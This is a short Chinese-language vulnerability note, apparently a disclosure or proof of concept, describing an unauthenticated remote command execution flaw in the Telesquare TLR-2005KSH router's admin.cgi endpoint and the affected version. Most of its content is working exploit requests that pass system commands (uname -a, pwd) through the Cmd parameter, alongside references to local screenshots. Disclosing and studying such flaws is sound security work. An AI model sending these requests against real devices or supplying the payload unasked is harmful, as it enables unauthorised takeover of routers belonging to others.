# Telesquare TLR-2005KSH 路由器存在未授权的远程命令执行漏洞

## 漏洞详细信息：

访问易受攻击的设备输入以下Payload，攻击者可以利用此漏洞通过Cmd参数在未授权的情况下执行系统命令



/cgi-bin/admin.cgi?Command=sysCommand&Cmd=uname%20-a

![image-20241213164321769](C:\Users\zzcun\AppData\Roaming\Typora\typora-user-images\image-20241213164321769.png)

/cgi-bin/admin.cgi?Command=sysCommand&Cmd=pwd

![image-20241213164436747](C:\Users\zzcun\AppData\Roaming\Typora\typora-user-images\image-20241213164436747.png)

此漏洞影响已知产品版本：2.6.36 及更高的版本